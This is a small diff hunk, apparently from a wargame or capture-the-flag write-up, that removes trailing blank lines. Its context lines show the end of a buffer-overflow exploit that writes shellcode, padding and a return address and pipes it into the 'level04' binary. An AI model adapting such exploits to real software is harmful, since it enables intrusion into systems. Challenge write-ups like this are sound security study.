@@ -123,7 +123,3 @@ sys.stdout.write(shellcode + padding + ret)
 EOF
 python /tmp/exploit.py | ./level04
 ```
-
-
----
-
